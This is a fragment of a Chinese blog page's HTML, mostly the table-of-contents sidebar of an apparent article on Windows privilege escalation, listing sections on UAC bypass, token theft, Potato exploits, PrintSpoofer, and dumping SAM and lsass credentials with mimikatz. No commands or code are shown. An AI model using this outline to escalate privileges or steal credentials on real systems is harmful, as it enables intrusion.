href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-text">组策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9"><span class="toc-text">组策略首选项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87UAC"><span class="toc-text">绕过UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-text">1.白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E6%89%BE%E5%87%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E3%80%82"><span class="toc-text">首先使用工具找出白名单的程序。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DDL%E5%8A%AB%E6%8C%81"><span class="toc-text">2.DDL劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E4%BB%BB%E7%9B%AE%E5%BD%95"><span class="toc-text">3.模拟可信任目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-MSF%E4%B8%8B%E7%9A%84Bypass"><span class="toc-text">4.MSF下的Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-text">令牌窃取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E5%81%B7"><span class="toc-text">1.直接偷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MSF%E5%81%B7"><span class="toc-text">2.MSF偷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Potato%E6%8F%90%E6%9D%83"><span class="toc-text">3.Potato提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hot-Potato"><span class="toc-text">Hot Potato</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Juicy-Potato"><span class="toc-text">Juicy Potato.</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-BITS-%E5%92%8C-CLSID%EF%BC%9F"><span class="toc-text">什么是 BITS 和 CLSID？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%99%E4%BA%9B%E5%9B%A0%E7%B4%A0%E7%9B%B4%E6%8E%A5%E5%BD%B1%E5%93%8D%E4%BD%A0%E8%83%BD%E5%90%A6%E6%89%BE%E5%88%B0%E5%8F%AF%E7%94%A8%E7%9A%84-CLSID%EF%BC%8C%E6%98%AF%E6%95%B4%E4%B8%AA%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E7%8E%AF%E8%8A%82%E3%80%82"><span class="toc-text">这些因素直接影响你能否找到可用的 CLSID，是整个利用过程中的关键环节。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%8F%82%E6%95%B0%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB"><span class="toc-text">利用流程与参数对应关系</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rotten-Potato-%E7%83%82%E5%9C%9F%E8%B1%86"><span class="toc-text">Rotten Potato(烂土豆)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rogue-Patato"><span class="toc-text">Rogue Patato</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SweetPotato"><span class="toc-text">SweetPotato</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GodPotato"><span class="toc-text">GodPotato</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PrintSpoofer"><span class="toc-text">PrintSpoofer</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-1%EF%BC%9A%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AA-SYSTEM-%E8%BF%9B%E7%A8%8B%E5%B9%B6%E4%B8%8E%E4%B9%8B%E4%BA%A4%E4%BA%92"><span class="toc-text">用法 1：启动一个 SYSTEM 进程并与之交互</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-2%EF%BC%9A%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA-SYSTEM-%E8%BF%9B%E7%A8%8B%E5%B9%B6%E9%80%80%E5%87%BA"><span class="toc-text">用法 2：生成一个 SYSTEM 进程并退出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-3%EF%BC%9A%E5%9C%A8%E6%A1%8C%E9%9D%A2%E4%B8%8A%E5%90%AF%E5%8A%A8-SYSTEM-%E8%BF%9B%E7%A8%8B"><span class="toc-text">用法 3：在桌面上启动 SYSTEM 进程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81"><span class="toc-text">密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8-1"><span class="toc-text">注册表</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%A4%84%E7%9A%84%E5%AF%86%E7%A0%81-%E6%89%8B%E5%B7%A5-winPEAS"><span class="toc-text">搜索注册表处的密码(手工&#x2F;winPEAS)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AD%E8%AF%81"><span class="toc-text">凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">搜索配置文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAM"><span class="toc-text">SAM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%9A%84hash%E5%AF%86%E7%A0%81%E6%A0%BC%E5%BC%8F"><span class="toc-text">Windows系统下的hash密码格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87SAM%E6%96%87%E4%BB%B6-mimikatz%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-text">通过SAM文件+mimikatz读取密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E4%BF%A1%E7%94%A8%E5%A5%97%E4%BB%B6%EF%BC%9A"><span class="toc-text">下载信用套件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%AF%B9SAM%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E7%9A%84%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%8F%90%E5%8F%96%E5%93%88%E5%B8%8C%EF%BC%9A"><span class="toc-text"> 运行对SAM和系统文件的工具来提取哈希：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hashcat%E7%A0%B4%E8%A7%A3%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C%EF%BC%9A"><span class="toc-text">使用hashcat破解管理员用户哈希：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8-Windows-%E8%BF%90%E8%A1%8C%E6%97%B6%EF%BC%8C%E6%96%87%E4%BB%B6%E5%B7%B2%E9%94%81%E5%AE%9A%E3%80%82"><span class="toc-text">在 Windows 运行时，文件已锁定。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lsass-exe-%E8%BF%9B%E7%A8%8B"><span class="toc-text">lsass.exe 进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#procdump64-%E5%BE%AE%E8%BD%AF%E8%87%AA%E5%B7%B1%E7%9A%84%E5%B7%A5%E5%85%B7-mimikatz"><span class="toc-text">procdump64(微软自己的工具)+mimikatz</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scheduled-Tasks"><span class="toc-text">Scheduled Tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8A%E4%BB%A5%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E3%80%82"><span class="toc-text">查看计算机上以管理权限运行的计划任务。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-text">用户权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-text">列出用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeAssignPrimaryPrivilege"><span class="toc-text">SeAssignPrimaryPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeAssignPrimaryPrivilege-1"><span class="toc-text">SeAssignPrimaryPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeBackupPrivilege"><span class="toc-text">SeBackupPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeRestorePrivilege"><span class="toc-text">SeRestorePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeTakeOwnershipPrivilege"><span class="toc-text">SeTakeOwnershipPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%89%B9%E6%9D%83-%E6%9B%B4%E9%AB%98%E7%BA%A7"><span class="toc-text">其他特权(更高级)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%89%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%9E%8B"><span class="toc-text">按系统类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows2000-2003%E3%80%81XP"><span class="toc-text"> Windows2000&#x2F;2003、XP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#at%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">at本地命令提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#at-%E9%85%8D%E5%90%88-msf%E6%8F%90%E6%9D%83"><span class="toc-text">at 配合 msf提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-7-8%E3%80%8103-08%E3%80%8112-16"><span class="toc-text">windows 7&#x2F;8、03&#x2F;08、12&#x2F;16</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sc%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">sc命令提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AlwaysInstallElevated"><span class="toc-text">AlwaysInstallElevated</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unattended-Installs"><span class="toc-text">Unattended Installs</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">第三方软件漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker"><span class="toc-text">docker</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
